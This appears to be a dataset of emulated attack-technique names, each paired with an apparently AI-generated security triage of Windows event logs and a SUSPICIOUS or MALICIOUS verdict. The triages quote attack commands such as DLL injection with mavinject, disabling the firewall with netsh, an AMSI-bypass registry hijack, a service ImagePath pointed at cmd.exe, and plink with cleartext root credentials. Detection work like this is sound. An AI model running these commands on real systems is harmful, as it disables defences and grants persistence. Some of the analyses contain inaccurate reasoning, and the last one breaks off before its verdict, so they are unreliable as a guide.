mavinject - Inject DLL into running process,"### Detailed Analysis of Logs

#### Observations

1. **Sysmon Event Analysis**:
   - **PowerShell and Wevtutil Execution**: There are multiple instances where `powershell.exe`, `wevtutil.exe`, and `conhost.exe` are executed by the user ""SERVER002\\admin_test"". The execution of `wevtutil.exe` multiple times within seconds is somewhat unusual, as this tool is typically used for managing event logs.
   - **Process Command Lines**: A significant finding is the execution of `cmd.exe` with a command line that includes `mavinject.exe` for injecting a DLL (`data.dll`) into a running process. This particular command is highly suspicious and commonly associated with malicious activity, specifically related to process injection or memory manipulation, which can be used for evading detection or gaining elevated privileges on the system.
   - **Integrity Levels**: Most processes run at a high integrity level, indicating they have significant privileges on the system.
   
2. **Application Logs**:
   - The application logs contain standard informational messages about the EdgeUpdate service. The stopping of EdgeUpdate around the time of the observed suspicious behavior in the Sysmon log could indicate a potential attempt to hide traces or impacts of the suspicious process execution.

3. **Absence of Other Logs**:
   - There are no entries for the Security, Windows PowerShell, or System logs provided, which limits the visibility into potential login attempts, script execution, or system-level alerts that might coincide with the observed Sysmon events.

#### Potential Indicators of Malicious Activity

- **Command Execution and Injection**: The command `cmd.exe /c mavinject.exe 1000 /INJECTRUNNING ...` executed with high privileges is a classic indicator of potential malicious activity. This command suggests an attempt to manipulate or inject code into other processes, possibly to bypass security controls or subvert application logic.
- **Temporal Correlation**: The high volume of related process creations within a short time frame involving critical system utilities (`wevtutil`, `cmd`, `mavinject`) strongly suggests a coordinated attempt to perform unauthorized actions on the host.

### Assessment

Given the context of events captured in the logs:

- The execution patterns and specific use of command line arguments appear consistent with potential compromise techniques (specifically code injection), which are often seen in sophisticated attacks.
- While the activity around Microsoft Edge Update appears routine, the suspicious PowerShell and particularly the `mavinject.exe` usage are significant red flags.

### Resolution

**Resolution**: **MALICIOUS**

The presence of a command aimed at injecting a DLL into a process, coupled with the use of system tools like `wevtutil.exe` shortly thereafter, strongly indicates potentially hostile activity on the host. Immediate containment and further detailed forensic investigation are recommended to determine the full impact, scope, and origin of the activity. Additionally, network monitoring for lateral movement, antivirus scan logs, and any unauthorized access attempts should be scrutinized to ensure comprehensive mitigation measures are in place."
Add Network Share,"After analyzing the provided Windows event logs from the system, security, application, Sysmon, and Windows PowerShell logs, here are my findings:

**1. Time Synchronization Events**:
- There are several TimeChange events (EventID 1 in the System log) caused by `svchost.exe`, which is typically associated with Windows services, including time synchronization. These events appear to be legitimate changes likely due to normal time synchronization processes from the `Windows Time Service`. The `time.windows.com` NTP server is being used.

**2. Process Execution and Command-Line Analysis**:
- The Sysmon logs indicate execution of several legitimate system utilities like `whoami.exe`, `cmd.exe`, `wevtutil.exe`, `net.exe`, and `net1.exe`, which were executed by the user `SERVER002\admin_test`.
- A notable command executed via `cmd.exe` involves `net use` and `net share` commands, potentially for setting up network shares:
  ```bash
  ""cmd.exe"" /c net use c: \\test\share & net share test=\\test\share /REMARK:""test share"" /CACHE:No
  ```
  These commands are usually legitimate in administrative scripts but can also be used in lateral movement or data exfiltration scenarios if not properly managed or monitored.

- The execution of `MicrosoftEdgeUpdate.exe` via `NT AUTHORITY\SYSTEM` shows standard update activities for Microsoft Edge, which looks benign.

**3. User Privileges and Login Activities**:
- Logs indicate activities executed by `SERVER002\admin_test` with high integrity levels, suggesting the user has administrative privileges. There is no indication of privilege escalation attempts within the logs.

**4. Anomalous or Suspicious Activities**:
- The repeated use of command-line utilities and network commands like `net use` and `net share` could be worth further investigation, especially if the user `admin_test` actions weren't scheduled or expected.

**Assessment and Resolution**:
- The activities observed in the logs, such as time synchronization by `svchost.exe`, execution of standard system utilities (`whoami.exe`, `cmd.exe`, `wevtutil.exe`, `net.exe`), and Edge update tasks, all appear consistent with legitimate system administration and maintenance tasks. The use of network-related commands may seem suspicious in certain contexts, especially if not expected, and should be confirmed with the responsible IT personnel.

Conclusion: **SUSPICIOUS** – While most activity appears to be legitimate, the network command used by `cmd.exe` linking network shares should be reviewed in detail with the relevant IT administrators to confirm if these actions were authorized and expected for typical operations. Additional context and monitoring might be needed to rule out lateral movement or data handling risks."
Create Windows Hidden File with Attrib,"After a detailed review of the provided Windows event logs, here’s a focused analysis of potentially suspicious activity:

1. **User Activity (admin_test):**
   - Several `cmd.exe` processes were initiated by the user ""SERVER002\admin_test"". An important command line observed: `cmd.exe /c echo system_Attrib_data.001 >> %temp%\data.001.txt` involves actions related to temporary files and potential automation scripts.
   - Commands checking the existence of a file (`IF EXIST %temp%\data.001.txt`) and subsequently modifying attributes (via `attrib.exe +h`) could indicate attempts to manipulate or hide data. This might be part of a batch script or automated task for maintenance or other operations, but the behavior aligns with typical data hiding methods used by malicious actors.

2. **Process Creation and Execution:**
   - Execution of `wevtutil.exe`, a tool for managing Windows event logs, can be legitimate or abused for clearing logs, indicating potential malicious clean-up efforts.
   - The usage of `HOSTNAME.EXE` and `whoami.exe` is typically benign, and is used to resolve the system's network identity and user credentials respectively. However, in some cases, it's used by attackers to gather system context.

3. **EdgeUpdate Activity:**
   - There are numerous logs about `MicrosoftEdgeUpdate.exe` and related setup or update processes executed under `NT AUTHORITY\SYSTEM` account. Although this is a common system service for updating Edge, a high frequency of events might require further correlation with update schedules.
   - Notably, the service was stopped twice within a short interval. Rapid stopping and restarting of services may point to a configuration update or an anomaly if unscheduled.

4. **Hashes and Executable Interactions:**
   - The presence of specific hash values without known threat signatures suggests no immediate evidence of tampered executables. However, the consistent pattern of file execution related to temporary files created (like `%temp%\data.001.txt`) should be verified for compliance with system usage.

**Assessment:**
- Although no definitive malicious signature is identified, the observed activities (temporary file utilization, process starts related to event logs, shell operations) could be components of normal administrative tasks or an indication of hiding/log clearing tactics.

**Resolution:**
- **SUSPICIOUS**: The activities in the logs warrant further investigation. While some actions may be benign, they also possess characteristics that could be indicative of malicious intent, particularly around file manipulation and event log management.

**Guidance on How to Proceed:**
- **Verify Scheduled Tasks**: Check if the observed cmd.exe commands correlate with scheduled maintenance or backup tasks.
- **Review System Updates**: Validate the EdgeUpdate.exe activities match with official update schedules.
- **Conduct User Interviews**: Confirm with the 'admin_test' account user if they performed any automation or scripting tasks around the time of the logs.
- **Check Integrity**: Run antivirus/endpoint protection scans ensuring hashes have not been flagged by threat intelligence sources."
Blackbit - Disable Windows Firewall using netsh firewall,"Upon reviewing the Windows event logs, here's a detailed analysis of the entries:

### Analysis:

1. **Service Control Manager Event (EventID 7040):**
   - The change of the `IKEEXT` (IKE and AuthIP IPsec Keying Modules) service from demand start to auto start was logged. This generally might not be suspicious unless there is no operational requirement for this change or if other network-related logs indicate anomalous behavior.
   
2. **Sysmon Logs (Various Events):**
   - Multiple executions of legitimate system utilities like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, and `netsh.exe` were observed. The `whoami.exe` and `hostname.exe` processes are benign and typically used to verify user and system information.
   - The execution of `cmd.exe` followed by `netsh.exe` with parameters to disable the firewall is highly suspicious. This could indicate an attempt to disable security mechanisms, which is a common action taken by malware or a malicious actor to prepare a host for further compromise or exfiltration activities.
   - Furthermore, use of `wevtutil.exe` to potentially export event logs to a temporary directory can indicate data exfiltration or log manipulation attempts.
   - The executables invoked under the high integrity context by `SERVER002\admin_test` user raises further concerns, especially if this is not typical behavior for this account or if it's an unusual time for these operations.

3. **Security Logs:**
   - EventID 4624 (successful logon) and 4672 (special privileges assigned) entries show SYSTEM-level logon with privileges such as `SeDebugPrivilege`, `SeAuditPrivilege`, etc. These are expected for system services but should be cross-referenced with other logs to ensure they were not improperly obtained.

### Assessment:

- The logs reveal the execution of standard system processes which, when seen in isolation, might appear benign. However, the particular combination of actions, specifically the disabling of the firewall using `netsh`, and the exporting of event logs with `wevtutil`, suggest activity that could be indicative of an intrusion or misuse.
- The usage of `cmd.exe` for disabling the firewall and potentially logging manipulation via `wevtutil.exe` suggests these actions are either conducted by an attacker or a user performing unusually elevated administrative tasks.

### Threats/Risks Identified:
- Potential unauthorized access and disabling of security controls.
- Possible log manipulation or exportation for nefarious purposes.

### Resolution:

- **SUSPICIOUS**: While not definitively malicious, the actions need further investigation due to the use of tools that can manipulate security configurations and logs. Verify the legitimacy of the user `admin_test` and obtain context on why these actions were taken. Additionally, cross-reference with network logs and user activity to ensure all actions were legitimate and authorized.

### Guidance:

- Conduct a thorough review of account activity for `SERVER002\admin_test` around the timestamps provided.
- Assess any other logs for similar activity around this timeframe to identify potential lateral movement.
- Reinstate firewall settings and enhance monitoring to detect further attempts to alter system configurations."
Activate Windows NoFind Group Policy Feature,"After analyzing the provided Windows event logs, I have identified several lines of activity that stand out for further examination:

### Suspicious or Anomalous Behavior:

1. **Time Change Events:**
   - Multiple events in the security and system logs show changes to the system time (`EventID: 4616` in the Security log and `EventID: 1` in the System log). Frequent or unexplained time changes could be indicative of an attempt to evade logging or forensic investigations.

2. **Command Execution with Registry Modification:**
   - A `cmd.exe` instance executed a command to modify the Windows registry (`EventID: 1` in the Sysmon log). The command `cmd.exe /c reg add ...` could potentially alter user interface policies. This type of behavior could be associated with malware if not authorized.

3. **Series of Process Creations:**
   - A pattern of process creations involving `wevtutil.exe` and `conhost.exe` for the user `SERVER002\admin_test`. While these applications aren't inherently malicious, the frequency and sequence might warrant investigation to confirm the purpose. For instance, `wevtutil.exe` is a command-line utility for managing event logs, and frequent use could indicate log tampering or a troubleshooting script.

4. **High Integrity Level Executions:**
   - The execution of commands and processes at a high integrity level suggests actions performed with elevated privileges. This includes manipulation of registry keys which might have greater effects if performed with administrative access.

### Threats or Risks Identified:

- **Possible Log Clearing or Modifications:**
  The repeated use of `wevtutil.exe` potentially for event log management or clearing could suggest intentions to tamper with or clean forensic evidence.
  
- **Registry Changes:**
  The automated or scripted registry modification via `cmd.exe` can be used to enforce restrictions or prepare the environment in ways not authorized by policy.

### Guidance and Conclusion:

**Resolution: SUSPICIOUS**

Based on the analysis, the activity recorded in these logs warrants a designated **SUSPICIOUS** classification. There is no definitive evidence of malicious activity, but the observed behaviors (e.g., frequent time changes, registry modifications, and use of critical system utilities like `wevtutil.exe`) suggest potential unapproved actions or a possible precursor to a compromise.

### Recommended Actions:

1. **Conduct a User Verification:**
   - Verify the legitimacy of the `SERVER002\admin_test` account activities with the user or administrator. Check if these actions were routine or expected maintenance tasks.

2. **Review System Integrity:**
   - Perform a system integrity check to ensure the registry, file system, and event logs have not been tampered with.

3. **Analyze Command Histories:**
   - Analyze command histories and scripts that might include `wevtutil.exe`, `cmd.exe`, and `reg.exe` to determine if these executions were part of a legitimate administrative operation.

4. **Monitor for Repeated Behavior:**
   - Increase monitoring on this host for repeated occurrences of these events. Implement alerts for further occurrences of time changes and unauthorized registry edits.

5. **Engage Incident Response if Necessary:**
   - If further evidence of compromise is discovered, consider engaging an incident response team for a detailed investigation."
InstallUtil HelpText method call,"After analyzing the provided Windows event logs, the following assessment is made:

### Analysis of the Logs:

#### PowerShell Logs:
1. **Event IDs 1067-1077**: These PowerShell logs indicate that a script (`InstallUtilTestHarness.ps1`) was executed, involving the use of the `.NET` `InstallUtil` utility. The script loads a PowerShell function, builds and executes a test assembly (`data.004.dll`), and compares actual and expected output.

   - **Execution of Dynamic Code**: The PowerShell script seems to include dynamic code execution through `Invoke-BuildAndInvokeInstallUtilAssembly` and the use of `Add-Type` to compile C# code on the fly.
   - **Use of InstallUtil**: `InstallUtil.exe`, used here to execute `data.004.dll`, is an indicator that can be exploited because it can load .NET assemblies and execute arbitrary code.
   - **Failure of Script Execution**: The output didn't match the expected result, leading to an execution failure.

2. **Commands and File Paths**: The commands executed include several references to temporary file paths under the control of `admin_test`. This could be an indication of script testing or even deployment practices for custom software.

3. **No Known Malicious Commands**: No documented malicious PowerShell commands or known exploits are directly evident from the log extract.

#### Sysmon Logs:
1. **Events for Process Execution**: Multiple commands related to system utilities like `HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`, and notably `powershell.exe` and `InstallUtil.exe` were executed under the context of the user `SERVER002\admin_test`.

   - **High Integrity Level**: The processes observed run at a high integrity level, typically indicating elevated privileges, likely since the actions are performed by an admin user.

2. **Processes of Interest**: The execution of C# compiler (`csc.exe`) and resource compiler (`cvtres.exe`) is notable as it indicates on-the-fly code compilation typically not seen in regular administrative operations.

3. **Temporal Alignment**: All these utilities' execution aligns temporally with the PowerShell events, corroborating the build and test narrative observed in the PowerShell script logs.

4. **Absence of Malicious Indicators**: No classic indicators of compromise (IoCs) such as known malicious hashes or unconventional parent-child process relationships that signal a typical cyber attack were observed.

### Assessment:
The activity observed could be aligned with legitimate administrative scripting and software development or testing activities. The execution of `InstallUtil` and use of PowerShell for scripting tests like this can be part of regular operations in a managed IT environment, especially for developers or IT professionals deploying custom solutions.

### Conclusion:
**Resolution: SUSPICIOUS**

While the activity could be part of legitimate testing or deployment processes, the use of `InstallUtil.exe` for executing a DLL via PowerShell is suspicious due to its abuse potential in bypassing traditional security controls. Therefore, further investigation is recommended to rule out the possibility of misuse, especially validating the intent and authorization of the actions taken by `admin_test`. Additionally, confirming the origin and purpose of the `data.004.dll` and associated scripts would provide more clarity. 

**Guidance on How to Proceed:**
1. **Verify User Intent**: Contact the user or administrator `SERVER002\admin_test` to confirm the intended use and necessity of these scripts.
2. **Evaluate Changes**: Review any changes made by these scripts and their possible impact on security settings.
3. **Monitoring and Alerts**: Implement monitoring of similar activities and set alerts for potentially harmful usages of PowerShell and `InstallUtil.exe`.
4. **Review Policies**: Ensure policies for script execution and use of administrative tools align with best practices for minimizing risks from misuse."
AMSI Bypass - Override AMSI via COM,"In analyzing the provided Windows event logs, several entries warrant closer examination due to their potentially suspicious nature:

1. **Cmd and Registry Changes**:
   - The execution of `cmd.exe` with a command line `REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f` is suspicious. This action could indicate an attempt to add a malicious DLL to be executed under specific COM objects.
   - The registry changes made by `reg.exe` further confirm that there is an attempt to manipulate the system registry.

2. **High Privilege Execution**:
   - The actions described above are executed under the `SERVER002\admin_test` user with a High integrity level, suggesting that the user has elevated privileges.

3. **Sysmon Events**:
   - Multiple executions of processes like `wevtutil.exe`, typically used to query the Windows Event Log, may indicate log manipulation or reconnaissance activity by an attacker.

4. **Time Synchronization Events**:
   - While time synchronization actions are not inherently malicious, they occurred around the same time as the suspicious registry changes. It might indicate programmatic changes to cover tracks.

5. **Microsoft Edge Update Processes**:
   - Numerous processes related to Microsoft Edge Update appear and terminate, which on the surface indicates routine updates. However, it aligns closely with the suspicious registry activity's timeline, warranting correlation checks to ensure these are indeed benign.

**Assessment**:
Given the suspicious command-line registry operations, high privilege execution, and potential for concealment activities, the logs indicate a possible compromise attempt or unauthorized configuration changes.

**Threat/Risk Level**:  
The observed behavior indicates a ""SUSPICIOUS"" activity level. It requires immediate further investigation to confirm:
- If the registry changes led to sustained unauthorized code execution.
- Whether the user `SERVER002\admin_test` was legitimately performing tasks or if their credentials/permissions were misused.
- Verification of integrity and legitimacy of Microsoft Edge Update processes executed during the time frame.

**Guidance on Proceeding**:
- Examine the `admin_test` account usage history and credentials security.
- Perform a full scan using updated security software to detect any anomalies.
- Investigate network traffic from `Server002` during the specific timeframe for any external communication correlating to the suspicious activities.
- Utilize threat hunting tools or scripts to check for the presence of the non-existent DLL referenced in the suspicious registry key.
- If confirmed malicious, isolate and escalate as per organizational security protocols.

Resolution: **SUSPICIOUS** - Further investigation needed to confirm malicious intent."
Compile After Delivery using csc.exe,"Upon reviewing the provided logs, here's a detailed analysis:

### System Log

- The logs predominantly involve typical Windows Update Client activities, confirming the installation and operation of a Security Intelligence Update for Microsoft Defender Antivirus. This appears standard and does not display any indicators of compromise.

### Application Log

- No application log entries were provided in the data, so no assessment can be made for this section.

### Security Log

- **EventID 4624** denotes a successful logon. The `LogonType` 3 indicates a network logon. The account `admin_test` from `DESKTOP-3HL5B2P` with IP `192.168.0.102` is used, suggesting remote access. No unusual behavior is noted, as it is a common administrative task.
  
- **EventID 4672** signifies special privileges were assigned during the logon session for the same user `admin_test`. The privileges include security-sensitive ones such as `SeDebugPrivilege`, which is commonly required for administrative functions but can be exploited for malicious purposes.
  
- **EventID 4634** denotes a logoff, suggesting the conclusion of the session.

- **EventID 5379** involves credential access errors related to Microsoft Account attempts, which could be benign service attempts but is worth noting if repeated frequently or if any partial credentials are targeted.

### Sysmon Log

- **Use of PowerShell and Unidentified Processes**: There is a mention of `powershell.exe` and an unknown process executed under `admin_test`. PowerShell usage is common, but unknown processes can merit further investigation to verify legitimacy.
  
- **Use of Windows Event Tools**: The usage of `wevtutil.exe` and `conhost.exe`, typically used for managing event logs and command console activities, could be regular administrative tasks but are also often used post-exploitation to cover tracks by manipulating event logs.

- **Use of `cmd.exe` to Call C# Compiler**: The command `""cmd.exe"" /c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe` is compiling a C# file found in a temporary directory to an executable in the Windows Temp directory. This behavior is suspicious as it implies potential arbitrary code execution. If the `calc.cs` source isn't standard or known, it raises a red flag.

- **`MicrosoftEdgeUpdate.exe` and Other System Tools**: These entries primarily highlight typical operations for system updates and maintenance. Examples include updating Microsoft Edge or performing anti-malware definition updates.

### Conclusion

Given the presence of benign system updates, typical administrative tasks, and logs indicating both standard and potentially suspicious behavior (such as the compilation and execution of C# code from a temporary directory), the overall situation merits a cautious approach.

### Resolution
The overall assessment should be:

**SUSPICIOUS**

### Guidance

- Further investigation is needed concerning the compilation and execution of C# code (`calc.cs`) found in temporary directories. Review administrative activity logs for the legitimacy of such operations.
- Ensure that `admin_test` activities are verified as authorized, especially pertaining to remote logins and executions in this context.
- Conduct audits on the use of elevated privileges to confirm they align with standard or expected activities.
- Monitor for any repeated or novel usage of credential access attempts which might suggest potential probing or unauthorized access attempts.

With this approach, confirm whether standard operating procedures are being followed or if there are grounds for escalating the findings to a more detailed forensic investigation."
Rundll32 with Ordinal Value,"After reviewing the provided Windows event logs from various channels, I have identified some patterns and activities that warrant further examination:

1. **Privilege Escalation Events:**
   - There are multiple `4672` security event IDs logged, which indicates that accounts with special privileges logged on. Notably, the account `admin_test` has a large set of privileges including `SeDebugPrivilege` which can be exploited by attackers for privilege escalation.
   
2. **Potentially Suspicious PowerShell Activity:**
   - The Sysmon log shows the execution of `powershell.exe` by the `admin_test` account. While PowerShell is a legitimate administration tool, it is frequently used in malicious activities, and careful monitoring of its usage is warranted.

3. **Suspicious Command Execution:**
   - The `cmd.exe` process executed with command line arguments that include `rundll32.exe` to run a DLL from a temporary directory. This specific type of behavior (`AllTheThingsx64.dll`) might indicate an attempt at executing malicious payload or script via Dynamic Link Library (DLL) injection which is a common cyber attack method.
   - The parent process for the `rundll32.exe` call is `wsmprovhost.exe`, part of Windows Management Instrumentation, which calls `cmd.exe`—a pattern associated with potential exploitation or ICommand control.

4. **System Utilities Execution:**
   - Execution of utilities like `whoami.exe`, `wevtutil.exe`, and `conhost.exe` occurred around the same time as `rundll32.exe`. This could indicate enumeration actions, potentially part of a larger script aimed at reconnaissance or post-exploitation on the system.

5. **Miscellaneous Updates:**
   - Several events pertain to the installation and update of the Microsoft Edge browser. These appear to be legitimate updates executed by the service `MicrosoftEdgeUpdate.exe` and can be classified as benign unless misused.

**Assessment and Resolution:**
Considering the evidence, especially the execution of `rundll32.exe` using a temporary DLL, the behavior raises the possibility of post-exploitation actions. Although not solely definitive of a threat, these indicators align with tactics commonly used in advanced persistent threats (APT) or malware distribution campaigns.

**Final Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Isolate the server (`Server002`) for in-depth forensics analysis and prevent potential lateral movement.
  - Conduct a virus and malware scan to inspect the temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\`) and the suspicious DLL.
  - Review and audit the account 'admin_test' activities with focus on privilege usage and command executions.
  
- **Further Investigation:**
  - Capture memory dumps to analyze processes that were running at the time of the suspicious activities.
  - Check network logs to identify any potential data exfiltration or command and control communication.
  - Review firewall and IDS/IPS logs around the time frame of suspicious events.

- **Enhancements to Monitoring and Defense:**
  - Implement PowerShell logging and monitoring techniques to detect potentially obfuscated or anomalous scripts.
  - Establish application whitelisting and restrict the execution of binaries from user-writable directories.
  - Increase awareness and training for users, especially those with elevated privileges, to recognize potential phishing or attack vectors. 

By following these recommendations, you can better determine whether an actual breach occurred and take appropriate defensive steps."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"Upon analyzing the provided logs, the following suspicious behaviors have been identified:

1. **Process Execution of `plink.exe`**:
   - The event with Sysmon EventID 1 shows `cmd.exe` executing `plink.exe`, a well-known tool used for command-line SSH operations. The command line includes the SSH connection details using clear text credentials (`-l ""root"" -pw ""pass""`).
   - This behavior is highly suspicious as it can indicate an attempt to establish unauthorized SSH sessions to a remote system.

2. **Frequent Execution of Windows Utilities**:
   - Multiple executions of utilities such as `wevtutil.exe`, `hostname.exe`, and `whoami.exe` were observed in a short time frame. While these utilities can be used legitimately, such frequent invocation could be indicative of reconnaissance activities (e.g., understanding system and network configurations).

3. **Administrative Command Execution**:
   - The presence of multiple processes being run by the `admin_test` user with high integrity level. It’s uncommon for an administrative user to frequently run such commands without explicit tasks like debugging or administrative provisioning.

4. **Security Logs with Elevated Privileges**:
   - There are multiple security events with EventID 4672 indicating special privileges were assigned, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. While SYSTEM account activities generated these, it's worth cross-referencing if these coincided with any unauthorized activities.

5. **External Connectivity Attempt**:
   - `cmd.exe` was used with parameters indicating remote connections. The presence of clear-text password further raises the suspicion of nefarious activities.

Clear Assessment and Risks:
- The execution of `plink.exe` with plain-text credentials potentially exposes sensitive information and provides a mechanism for lateral movement within the network.
- High frequency of benign Windows administrative commands over a short interval can signify batch processing or scripting activity often used by threat actors during reconnaissance and system enumeration.

Given these findings, the resolution for the activity observed in the logs is **MALICIOUS**.

Guidance on Next Steps:
- Immediate investigation into unauthorized SSH attempts should be conducted, focusing on the origin and destination of such connections.
- Affected systems should be isolated to prevent further access and extraction of data.
- Review and enhance security controls around the PowerShell environment and command execution policies.
- Implement stricter monitoring and access control measures for privileged accounts and sensitive operations.
- Conduct a broader investigation to identify potential additional compromises across the network.

In summary, the activity within the logs suggests a potential security breach aimed at accessing and possibly exfiltrating sensitive data. Immediate and thorough incident response actions are necessary to mitigate further risks and understand the full impact of the compromise."
Service ImagePath Change with reg.exe,"Upon reviewing the provided Windows event logs, I have identified some activities that are noteworthy for analysis:

1. **Powershell Activity:**
   - There are multiple instances of the `powershell.exe` being executed by user `SERVER002\admin_test`. While using PowerShell can be a regular system admin task, it is often abused by attackers to execute scripts or commands that might compromise the system. However, as there are no specific details on the command-line arguments or scripts executed, we can't definitively say this activity is malicious without further context.

2. **Command-Line Execution and Registry Modification:**
   - The Sysmon logs reveal a `cmd.exe` process executed with the command line `\""cmd.exe\"" /c reg.exe add \""HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\"" /f /v ImagePath /d \""%%windir%%\\system32\\cmd.exe\""`. This command is adding a new service in the registry with a path pointing to `cmd.exe`. This is a common persistence technique used by attackers to ensure their scripts or payload gets executed automatically when the system starts.

3. **Service Creation:**
   - The creation of a registry entry for a service named `calcservice` that points directly to `cmd.exe` is extremely suspicious. Typically, benign services would point to a legitimate executable that's part of a service application, not to the command-line executable like `cmd.exe`.

4. **Use of `wevtutil.exe` and `conhost.exe`:**
   - The repeated use of `wevtutil.exe` and `conhost.exe` by the same user `SERVER002\admin_test` could be linked to script-based activities, possibly for event log manipulation or running console-based commands. However, without specific evidence of malicious actions via these processes, these activities alone don't confirm malicious intent.

5. **Utilities Executed:**
   - Utilities like `hostname.exe` and `whoami.exe` were executed. These utilities are often used in scripts or by attackers to gather system information, but on their own, they aren't inherently malicious.

### Assessment:
- **SUSPICIOUS Activity:** Although we cannot definitively determine malicious intent solely from these logs due to the lack of specific malicious payloads or harmful indicators, there are still suspicious activities that warrant further investigation. The modification of registry settings to establish a new service with `cmd.exe` is particularly concerning as a persistence technique and suggests further scrutiny of the user's actions and command history is necessary.

### Guidance:
- **Immediate Action:**
  - Conduct a deeper investigation into the `admin_test` user activities around the logged time.
  - Review the content and history of executed PowerShell scripts, particularly any unusual scripts run around the activities concerned.
  - Inspect the system for any unintended services or scheduled tasks that may have been created.
  - Ensure detailed monitoring of remote administration tools and command scripting on the affected system.

- **Long-term Recommendations:**
  - Implement stricter PowerShell execution policies and logging for better insight into command execution.
  - Review security policies related to user privilege escalation and command execution, especially for administrative accounts.
  - Initiate a review of Windows host logs in real-time to detect similar registry or process anomalies promptly.

Given the identified activities, further investigation is needed to determine the intent behind the suspicious actions. The resolution here falls under ""SUSPICIOUS"" due to the potential risk implied by the registry modifications."
Microsoft.Workflow.Compiler.exe Payload Execution,"### Detailed Analysis:
Upon reviewing the provided event logs, several patterns and activities emerge that warrant attention:

1. **Legitimate System Activities**:
   - **EdgeUpdate**: Numerous instances of ""Microsoft Edge Update"" processes such as `MicrosoftEdgeUpdate.exe` running with different command line arguments. While these are typically legitimate operations related to software updates, their frequent execution can occasionally point to suspicious activities if they are conducted too frequently or anomalously.
   - **Svchost, WerFault, and Sppsvc**: Instances of common Windows processes such as `svchost.exe`, `WerFault.exe`, and `sppsvc.exe` are present. These seem consistent with normal system operation.
   - **Security Auditing**: Normal events are generated like `Login` (4624) and `Privileges` (4672).

2. **PowerShell Use**:
   - There are multiple events associated with the execution of PowerShell scripts, which is a common vector for malicious activities. PowerShell is executing with a complex command, `""powershell.exe"" & {C:\Windows\Microsoft.NET\Framework64\v4.0.30319\microsoft.workflow.compiler.exe ""\""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.xml\"""" output.txt}`.
   - Additionally, the runtime environment setup for PowerShell includes some interesting provider starts such as `Registry`, `FileSystem`, `Alias`, etc., initializing (`EventID 600`), and a switch to a `Stopped` state (`EventID 403`). This JSON payload is not inherently suspicious but should be interpreted in context where no advanced logging or auditing policies are configured.

3. **Workflow Compiler Exception**:
   - A notable `.NET Runtime` error (`EventID 1026`) reports an unhandled exception due to a `DirectoryNotFoundException` for `microsoft.workflow.compiler.exe`. This could signify a misconfiguration or neglected cleanup of application data, but given the use of the workflow compiler in a PowerShell command, it suggests an incomplete or failed execution attempt for a task, possibly script-based automation tasks.

4. **Repeated Service Stops**:
   - Multiple logs (`EventID 2386, 2388`) indicate that Microsoft's `EdgeUpdate` service stopped multiple times. While it could be routine adjustments or updates, frequent starting and stopping in a short timeframe may flag an anomaly or undesired behavior, particularly when observing other suspicious activities.

### Assessment:
Based on the analysis of these event logs:
- **Suspicious Activity**: The use of PowerShell with a complex command to execute a potentially uncommon process (microsoft.workflow.compiler.exe) raises suspicion, especially alongside a .NET Runtime exception pointing towards issues with directory access for the compiler.
- **Routine Activities**: The system generated logs (e.g., EdgeUpdate processes, svchost, WerFault) appear relatively standard, aligning with typical software update and system maintenance activities.

### Risk and Threat Identification:
- **Potential Threat**: Given the suspicious use of PowerShell and associated workflow compiler activities, it's conceivable there might be an attempt to execute unauthorized scripts or operations.
- **Current Events**: Without further context, repeated EdgeUpdate instructions combined with PowerShell usage appear anomalous but not definitively malicious.

### Guidance and Resolution:
- **Resolution**: **SUSPICIOUS**
- **Next Steps**:
  - **Conduct Deep Dive Analysis**: Investigate recent activities of the user `admin_test`, look into subsequent activities, and gather related network traffic logs or file system changes.
  - **Restrict Potentially Abusive Tools**: Temp disable PowerShell if deemed non-essential or deploy enhanced logging features to scrutinize PowerShell activity.
  - **Monitor System Logs**: Implement strict monitoring for continuous EdgeUpdate-triggered processes or irregular PowerShell usage.
  - **Correlation with External Threat Intelligence**: Validate SHA256 hash values against threat intelligence databases to identify any known malicious software.

Further investigation is recommended to determine if the anomaly is indicative of an active threat or a benign misconfiguration."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"Based on the Windows event logs provided, I've conducted a detailed analysis with a focus on identifying any suspicious or malicious activities. Below, I summarize the findings across various types of logs:

### Windows PowerShell Log
- **Status**: Not provided. Typically, we would review PowerShell logs for any scripts or commands executed that might be suspicious or involved with lateral movement, data exfiltration, or credential dumping. Unfortunately, no entries were provided for this analysis.

### Application Log
- **Edge Update Service Stopped**: Multiple entries indicating the `edgeupdate` service was stopped. This could be routine unless coupled with other notable events suggesting interference or tampering.
- **Software Protection Platform Service**: Logging related to software licensing and protection, seems to perform ordinarily without anomalies.

### System Log
- **Time Setting Adjustments**: Events related to time adjustments seem to be taking place in quick succession. However, the time adjustment itself is minor (microseconds difference) and seems to be part of regular time synchronization, possibly with NTP (as indicated by `time.windows.com`).
  
### Sysmon Log
- **Microsoft Edge Update Activities**: A significant number of entries for the Microsoft Edge updates indicate version upgrades and service adjustments. All processes related to these updates (e.g., `MicrosoftEdgeUpdate.exe`) appear legitimate and expected with valid SHA256 checksums.
- **Command Line Execution**: There is an entry involving command-line registry modification with `cmd.exe` adding a value to the registry (`HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor`). While registry manipulation can be a red flag, this specific registry key involvement can be benign if related to legitimate policy changes or configurations by admin users.
- **Process Execution**: Legitimate Windows processes like `hostname.exe`, `whoami.exe`, and `conhost.exe` are being executed, possibly by the `admin_test` account. This does not inherently look suspicious since no unusual command-line arguments or behaviors are noted.

### Security Log
- **User Privileges**: The `admin_test` account logged in with multiple privileges granted (e.g., SeDebugPrivilege, SeBackupPrivilege), often seen in administrative logins. The privileges themselves aren't necessarily malicious unless misused.
- **Logon Events**: Logon with NTLM authentication suggests domain-related activity which, unless appearing in high frequency from unusual sources, is normal in enterprise settings.

### Summary and Resolution
Based on the captured activities:
1. **Overall Pattern**: The analyzed events suggest largely legitimate and routine operations. The Microsoft Edge updates and registry management appear to align with authorized administrative tasks.
